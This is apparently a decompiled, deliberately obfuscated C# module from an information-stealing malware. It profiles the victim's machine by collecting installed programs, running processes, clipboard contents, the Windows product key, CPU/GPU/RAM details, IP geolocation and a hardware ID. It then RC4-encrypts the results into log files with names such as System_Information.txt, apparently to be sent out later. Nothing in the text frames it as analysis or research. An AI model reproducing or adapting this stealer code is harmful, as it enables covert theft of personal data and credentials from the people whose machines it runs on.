using System;
using System.Diagnostics;
using System.Drawing;
using System.Management;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000015 RID: 21
	internal class Class_14
	{
		// Token: 0x0600004B RID: 75 RVA: 0x00004098 File Offset: 0x00002298
		[STAThread]
		public static void vmethod_35(string str_0)
		{
			Class_14.NClass_0 nclass_ = new Class_14.NClass_0();
			nclass_.field_3 = str_0;
			try
			{
				Class_14.NClass_1 nclass_2 = new Class_14.NClass_1();
				nclass_2.field_4 = new Task[]
				{
					new Task(new Action(nclass_.nmethod_1))
				};
				nclass_2.field_5 = new Task[]
				{
					new Task(new Action(nclass_.nmethod_2))
				};
				nclass_2.field_6 = new Task[]
				{
					new Task(new Action(nclass_.nmethod_3))
				};
				nclass_2.field_7 = new Task[]
				{
					new Task(new Action(nclass_.nmethod_4))
				};
				nclass_2.field_8 = new Task[]
				{
					new Task(new Action(nclass_.nmethod_5))
				};
				new Thread(new ThreadStart(nclass_2.nmethod_7)).Start();
				new Thread(new ThreadStart(nclass_2.nmethod_8)).Start();
				new Thread(new ThreadStart(nclass_2.nmethod_9)).Start();
				new Thread(new ThreadStart(nclass_2.nmethod_10)).Start();
				new Thread(new ThreadStart(nclass_2.nmethod_11)).Start();
				Task.WaitAll(nclass_2.field_4);
				Task.WaitAll(nclass_2.field_5);
				Task.WaitAll(nclass_2.field_6);
				Task.WaitAll(nclass_2.field_7);
				Task.WaitAll(nclass_2.field_8);
			}
			catch
			{
			}
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00004230 File Offset: 0x00002430
		public static void dmethod_36(string str_0)
		{
			string text = "";
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
				string[] subKeyNames = registryKey.GetSubKeyNames();
				for (int i = 0; i < subKeyNames.Length; i++)
				{
					string text2 = registryKey.OpenSubKey(subKeyNames[i]).GetValue("DisplayName") as string;
					if (text2 != null)
					{
						text = text + text2 + Environment.NewLine;
					}
				}
				Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Programs.txt", Class_47.RC4(Encoding.UTF8.GetBytes(text)));
			}
			catch
			{
			}
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000042F0 File Offset: 0x000024F0
		public static void kmethod_37(string str_0)
		{
			try
			{
				string text = "";
				foreach (Process process in Process.GetProcesses())
				{
					text = text + process.ProcessName + Environment.NewLine;
				}
				Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Processes.txt", Class_47.RC4(Encoding.UTF8.GetBytes(text)));
			}
			catch
			{
			}
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00004388 File Offset: 0x00002588
		public static string lmethod_38()
		{
			string result;
			try
			{
				string text = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						string str = text;
						object obj = managementObject["Description"];
						text = str + ((obj != null) ? obj.ToString() : null) + " ";
					}
				}
				result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004478 File Offset: 0x00002678
		public static string pmethod_39()
		{
			string result;
			try
			{
				ManagementScope scope = new ManagementScope();
				ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
				ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
				long num = 0L;
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
				{
					long num2 = Convert.ToInt64(((ManagementObject)managementBaseObject)["Capacity"]);
					num += num2;
				}
				num = num / 1024L / 1024L;
				result = num.ToString();
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000050 RID: 80 RVA: 0x0000453C File Offset: 0x0000273C
		public static string smethod_40()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return string.Concat(new string[]
					{
						((string)managementObject["Caption"]).Trim(),
						", ",
						(string)managementObject["Version"],
						", ",
						(string)managementObject["OSArchitecture"]
					});
				}
				catch
				{
				}
			}
			return "BIOS Maker: Unknown";
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004620 File Offset: 0x00002820
		public static string xmethod_41()
		{
			string result;
			try
			{
				ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
				string text = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in instances)
				{
					text = (string)((ManagementObject)managementBaseObject)["Name"];
				}
				result = text;
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000052 RID: 82 RVA: 0x000046C0 File Offset: 0x000028C0
		public static void tmethod_42(string str_0)
		{
			ComputerInfo computerInfo = new ComputerInfo();
			Size size = Screen.PrimaryScreen.Bounds.Size;
			try
			{
				string text = "";
				string[] array = new string[35];
				array[0] = text;
				array[1] = "==================================================\n Operating system: ";
				int num = 2;
				OperatingSystem osversion = Environment.OSVersion;
				array[num] = ((osversion != null) ? osversion.ToString() : null);
				array[3] = " | ";
				array[4] = computerInfo.OSFullName;
				array[5] = "\n PC user: ";
				array[6] = Environment.MachineName;
				array[7] = "/";
				array[8] = Environment.UserName;
				array[9] = "\n WinKey: ";
				array[10] = Class_9.smethod_30("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DigitalProductId");
				array[11] = "\n==================================================\n Screen resolution: ";
				int num2 = 12;
				Size size2 = size;
				array[num2] = size2.ToString();
				array[13] = "\n Current time Utc: ";
				array[14] = DateTime.UtcNow.ToString();
				array[15] = "\n Current time: ";
				array[16] = DateTime.Now.ToString();
				array[17] = "\n==================================================\n CPU: ";
				array[18] = Class_14.xmethod_41();
				array[19] = "\n RAM: ";
				array[20] = Class_14.pmethod_39();
				array[21] = "\n GPU: ";
				array[22] = Class_14.lmethod_38();
				array[23] = "\n BIOS: ";
				array[24] = Class_14.smethod_40();
				array[25] = "\n ==================================================\n IP Geolocation: ";
				array[26] = Class_47.IP();
				array[27] = " ";
				array[28] = Class_47.Country();
				array[29] = "\n Log Date: ";
				array[30] = Class_47.\u033B\u033C\u0355\u0314\u0330\u0316\u0326\u0327\u0349\u035Ei\u036B\u031D\u0363\u0322\u0367hzhsdavyvmobkojd\u0020\u0309\u033F\u0362\u0020\u0347\u036B\u0366\u0347\u036B\u0356\u0349\u0347\u035C\u0306\u032Djkgcmitutxmwdtwk;
				array[31] = "\n Version build: ";
				array[32] = Class_103.field_0;
				array[33] = "\n HWID: ";
				array[34] = Class_47.\u030C\u0360\u0352\u0330\u0020\u0345\u034D\u031F\u0317\u0020\u036F\u032F\u0335\u0303\u0020\u0348btjzcydnmobecrmu\u0E47\u0E47\u0363\u0E47r\u0367\u0323\u0347\u0331\u0347\u032C\u0348\u0332\u035F\u036B\u034Eplwrzxwpllzxvpwz;
				text = string.Concat(array);
				Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(Class_47.\u0337\u0329\u035A\u0341t\u033C\u0020\u034E\u035B\u0322\u0313\u0308\u0320\u0367\u0329\u0359yotlhmdsspprsbmv\u0020\u0315\u0369\u0020\u0363\u034C\u0020\u0308\u035E\u0368\u0020\u030E\u0307\u033C\u0367\u0020jzrebbgywcogvccr + "\\System_Information.txt", Class_47.RC4(Encoding.UTF8.GetBytes(text)));
			}
			catch
			{
			}
		}

		// Token: 0x02000016 RID: 22
		[CompilerGenerated]
		private sealed class NClass_0
		{
			// Token: 0x06000054 RID: 84 RVA: 0x0000237C File Offset: 0x0000057C
			public void nmethod_0()
			{
				base..ctor();
			}

			// Token: 0x06000055 RID: 85 RVA: 0x000048C4 File Offset: 0x00002AC4
			internal void nmethod_1()
			{
				Class_14.tmethod_42(this.field_3);
			}

			// Token: 0x06000056 RID: 86 RVA: 0x000048D1 File Offset: 0x00002AD1
			internal void nmethod_2()
			{
				Class_14.dmethod_36(this.field_3);
			}

			// Token: 0x06000057 RID: 87 RVA: 0x000048DE File Offset: 0x00002ADE
			internal void nmethod_3()
			{
				Class_14.kmethod_37(this.field_3);
			}

			// Token: 0x06000058 RID: 88 RVA: 0x000048EB File Offset: 0x00002AEB
			internal void nmethod_4()
			{
				Class_16.GetClipboard(this.field_3);
			}

			// Token: 0x06000059 RID: 89 RVA: 0x000048F8 File Offset: 0x00002AF8
			internal void nmethod_5()
			{
				Class_114.cmethod_414(this.field_3);
			}

			// Token: 0x0400003B RID: 59
			public string field_3;
		}

		// Token: 0x02000017 RID: 23
		[CompilerGenerated]
		private sealed class NClass_1
		{
			// Token: 0x0600005A RID: 90 RVA: 0x0000237C File Offset: 0x0000057C
			public void nmethod_6()
			{
				base..ctor();
			}

			// Token: 0x0600005B RID: 91 RVA: 0x00004908 File Offset: 0x00002B08
			internal void nmethod_7()
			{
				Task[] array = this.field_4;
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Start();
				}
			}

			// Token: 0x0600005C RID: 92 RVA: 0x0000493C File Offset: 0x00002B3C
			internal void nmethod_8()
			{
				Task[] array = this.field_5;
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Start();
				}
			}

			// Token: 0x0600005D RID: 93 RVA: 0x00004970 File Offset: 0x00002B70
			internal void nmethod_9()
			{
				Task[] array = this.field_6;
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Start();
				}
			}

			// Token: 0x0600005E RID: 94 RVA: 0x000049A4 File Offset: 0x00002BA4
			internal void nmethod_10()
			{
				Task[] array = this.field_7;
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Start();
				}
			}

			// Token: 0x0600005F RID: 95 RVA: 0x000049D8 File Offset: 0x00002BD8
			internal void nmethod_11()
			{
				Task[] array = this.field_8;
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Start();
				}
			}

			// Token: 0x0400003C RID: 60
			public Task[] field_4;

			// Token: 0x0400003D RID: 61
			public Task[] field_5;

			// Token: 0x0400003E RID: 62
			public Task[] field_6;

			// Token: 0x0400003F RID: 63
			public Task[] field_7;

			// Token: 0x04000040 RID: 64
			public Task[] field_8;
		}
	}
}
